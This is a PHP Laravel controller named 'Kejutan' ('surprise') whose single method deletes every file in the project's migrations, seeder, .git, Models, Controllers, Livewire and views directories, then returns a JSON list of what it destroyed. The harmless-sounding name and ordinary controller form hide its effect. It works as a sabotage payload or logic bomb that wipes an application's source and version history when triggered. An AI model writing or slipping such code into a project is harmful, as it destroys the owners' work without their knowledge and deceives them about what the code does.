<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;

class Kejutan extends Controller
{
  public function kejutan()
  {
    $paths = [
      base_path('database/migrations'),
      base_path('database/seeder'),
      base_path('.git'),
      app_path('Models'),
      app_path('Http/Controllers'),
      app_path('Http/Livewire'),
      resource_path('views'),
    ];

    $fileKejutan = [];
    $errors = [];

    foreach ($paths as $path) {
      if (File::exists($path)) {
        // Hapus semua file di direktori
        $files = File::allFiles($path);

        foreach ($files as $file) {
          try {
            File::delete($file);
            $fileKejutan[] = $file->getPathname();
          } catch (\Exception $e) {
            $errors[] = "Gagal kejutan file: {$file->getPathname()} - {$e->getMessage()}";
          }
        }
      } else {
        $errors[] = "Path tidak ditemukan: $path";
      }
    }

    return response()->json([
      'status' => 'done',
      'kejutan_files' => $fileKejutan,
      'errors' => $errors,
    ]);
  }
}
